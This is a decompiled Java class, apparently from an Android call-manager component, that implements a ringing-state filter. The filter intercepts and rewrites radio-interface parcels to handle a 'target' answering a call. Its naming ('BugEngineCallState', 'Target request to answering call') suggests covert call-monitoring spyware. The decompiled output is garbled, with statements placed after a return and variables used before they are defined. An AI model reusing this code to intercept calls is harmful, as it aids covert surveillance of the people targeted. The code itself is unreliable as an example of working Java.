package com.vvt.callmanager.filter;

import android.os.Parcel;
import com.vvt.callmanager.a.l;
import com.vvt.callmanager.a.m;
import com.vvt.callmanager.ref.BugEngineCallState;

 enum FilterGsmCall$CallState$3
{
  private int cacheAnswerCallSerailNumberReq;
  private boolean isWaitingForResponse;
  private Object transition;
  
  FilterGsmCall$CallState$3()
  {
    super(paramString, paramInt, null);
  }
  
  public void onEnter(Object paramObject)
  {
    boolean bool = FilterGsmCall.b();
    if (bool) {}
    FilterGsmCall.a(this.mFilterCall);
    FilterGsmCall localFilterGsmCall = this.mFilterCall;
    BugEngineCallState localBugEngineCallState = BugEngineCallState.GSM_RINGING;
    FilterGsmCall.a(localFilterGsmCall, localBugEngineCallState);
  }
  
  public Object onExit()
  {
    boolean bool = FilterGsmCall.b();
    if (bool) {}
    FilterGsmCall.b(this.mFilterCall);
    return this.transition;
  }
  
  public FilterGsmCall.CallState processResponse(Parcel paramParcel)
  {
    boolean bool1 = true;
    float f1 = Float.MIN_VALUE;
    boolean bool2 = false;
    float f2 = 0.0F;
    Object localObject1 = null;
    Object localObject2 = FilterGsmCall.c(this.mFilterCall);
    int i = ((m)localObject2).c(paramParcel);
    int n = 9;
    if (i == n)
    {
      localObject2 = l.a(paramParcel);
      i = ((l)localObject2).b;
      n = 134744072;
      if (i != n)
      {
        localObject1 = FilterGsmCall.a(this.mFilterCall, this, paramParcel);
        localObject2 = OFFHOOK;
        if (localObject1 == localObject2) {
          this.transition = paramParcel;
        }
      }
    }
    for (;;)
    {
      if (bool1)
      {
        localFilterGsmCall = this.mFilterCall;
        localFilterGsmCall.c(paramParcel);
      }
      return (FilterGsmCall.CallState)localObject1;
      bool1 = false;
      FilterGsmCall localFilterGsmCall = null;
      f1 = 0.0F;
      break;
      boolean bool4 = this.isWaitingForResponse;
      int k;
      if (!bool4)
      {
        int i1 = this.cacheAnswerCallSerailNumberReq;
        if (i1 > 0)
        {
          boolean bool3 = FilterGsmCall.b();
          if (bool3) {}
          localObject2 = l.a(paramParcel);
          int j = ((l)localObject2).c;
          if (j > 0)
          {
            k = FilterGsmCall.b();
            if (k != 0) {}
            localObject2 = this.mFilterCall;
            m localm = FilterGsmCall.c(this.mFilterCall);
            i.c((n)localObject2, localm);
            this.isWaitingForResponse = bool1;
          }
          for (;;)
          {
            bool1 = bool2;
            f1 = f2;
            localObject1 = this;
            break;
            this.cacheAnswerCallSerailNumberReq = 0;
            bool2 = FilterGsmCall.b();
            if (bool2) {}
            bool2 = bool1;
            f2 = f1;
          }
        }
      }
      boolean bool5 = this.isWaitingForResponse;
      if (bool5)
      {
        int i2 = 15;
        if (k == i2)
        {
          k = FilterGsmCall.b();
          if (k != 0) {}
          paramParcel.setDataPosition(8);
          int m = this.cacheAnswerCallSerailNumberReq;
          paramParcel.writeInt(m);
          this.cacheAnswerCallSerailNumberReq = 0;
        }
      }
      localObject1 = this;
    }
  }
  
  public FilterGsmCall.CallState processRilRequest(Parcel paramParcel)
  {
    Object localObject = FilterGsmCall.c(this.mFilterCall);
    int i = ((m)localObject).b(paramParcel);
    int j = 40;
    if (i == j)
    {
      FilterGsmCall.a(this.mFilterCall, "Target request to answering call");
      i = l.a(paramParcel).b;
      this.cacheAnswerCallSerailNumberReq = i;
      localObject = this.mFilterCall;
      int k = 1;
      Object[] arrayOfObject = new Object[k];
      int m = this.cacheAnswerCallSerailNumberReq;
      Integer localInteger = Integer.valueOf(m);
      arrayOfObject[0] = localInteger;
      String str = String.format("Caching answer call request serial number: %d", arrayOfObject);
      FilterGsmCall.a((FilterGsmCall)localObject, str);
    }
    FilterGsmCall.c(this.mFilterCall).b(paramParcel);
    this.mFilterCall.d(paramParcel);
    return this;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/filter/FilterGsmCall$CallState$3.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */